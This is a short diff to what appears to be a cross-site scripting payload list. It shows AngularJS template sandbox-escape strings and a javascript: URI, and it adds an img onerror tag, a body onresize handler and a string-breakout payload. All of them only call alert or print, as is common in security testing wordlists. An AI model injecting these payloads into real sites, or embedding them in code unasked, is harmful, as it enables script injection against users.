@@ -12,3 +12,6 @@ javascript:alert(1)
 {{0[a='constructor'][a]('alert(1)')()}}
 {{$eval.constructor('alert(1)')()}}
 {{$on.constructor('alert(1)')()}}
+\"-alert(1)}//
+<><img src=1 onerror=alert(1)>
+<body onresize=print()>
